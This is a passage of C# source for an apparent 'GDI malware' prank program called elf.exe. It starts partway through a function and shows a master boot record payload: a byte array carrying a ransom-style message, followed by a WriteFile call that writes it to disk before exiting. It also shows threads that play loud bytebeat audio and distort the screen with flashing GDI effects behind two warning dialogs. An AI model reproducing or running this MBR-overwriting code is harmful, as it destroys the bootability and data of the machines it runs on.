                0x6F, 0x79, 0x65, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
                0x00, 0x45, 0x6C, 0x66, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20,
                0x74, 0x72, 0x75, 0x65, 0x20, 0x6E, 0x61, 0x6D, 0x65, 0x00, 0x48, 0x69, 0x73, 0x20, 0x6E, 0x61,
                0x6D, 0x65, 0x20, 0x69, 0x73, 0x20, 0x5B, 0x44, 0x41, 0x54, 0x41, 0x20, 0x45, 0x58, 0x50, 0x55,
                0x4E, 0x47, 0x45, 0x44, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A
            };

            WriteFile(kernel, MbrData, NazariusOS, out uint BytesToRead, IntPtr.Zero);
            Environment.Exit(-1);
        }

        public static void BSOD()
        {

        }

        public static void StartForm()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }

    public class ThreadStuff
    {
        [DllImport("user32.dll")]
        private static extern bool TerminateThread(IntPtr hThread, Thread thread);

        [DllImport("kernel32.dll")]
        private static extern bool CloseHandle(Thread hObject);

        public static void InitEffects()
        {
            Thread threadform = new Thread(SystemPayloads.StartForm);
            Thread bb1 = new Thread(Bytebeats.Bytebeat1);
            threadform.Start();
            bb1.Start();
            Thread.Sleep(40000);
            Thread bb2 = new Thread(Bytebeats.Bytebeat2);
            Thread thread1 = new Thread(GDIEffects.Blur1);
            thread1.Start();
            Thread.Sleep(40000);
            Thread thread2 = new Thread(GDIEffects.Texts);
            Thread bb3 = new Thread(Bytebeats.Bytebeat3);
            bb2.Start();
            thread2.Start();
            Thread.Sleep(40000);
            Thread thread3 = new Thread(GDIEffects.BarakoEffect);
            Thread bb4 = new Thread(Bytebeats.Bytebeat4);
            thread3.Start();
            Thread.Sleep(40000);
            Thread thread4 = new Thread(GDIEffects.Pats);
            bb3.Start();
            thread4.Start();
            Thread.Sleep(40000);
            Thread thread5 = new Thread(GDIEffects.Masher);
            bb4.Start();
            thread5.Start();
            Thread.Sleep(40000);
            Thread thread6 = new Thread(GDIEffects.BitBlts);
            thread6.Start();
            Thread.Sleep(40000);
            Thread thread7 = new Thread(GDIEffects.Bright);
            thread7.Start();
            Thread.Sleep(40000);
        }
    }

    internal static class Program
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);
        [STAThread]
        static void Main()
        {
            if
            (
                MessageBox.Show
                (
                    "WARNING!!!\n\n" + 
                    "Running this application may cause instability and performance issues. " +
                    "This is the safety version, but have flashing lights and louds sounds.\n\n" +
                    "Do you want to run it?", "'I am powerfull to destroy the whole universe",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning,
                    MessageBoxDefaultButton.Button2
                ) == DialogResult.Yes
            )
            {
                if 
                (
                    MessageBox.Show
                    (
                        "This is the last warning." +
                        "Are you sure you want to run this application?",
                        "elf.exe - Last Warning",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning,
                        MessageBoxDefaultButton.Button2
                    ) == DialogResult.Yes
                )
                {
                    ThreadStuff.InitEffects();
                }
            }
        }
    }
}
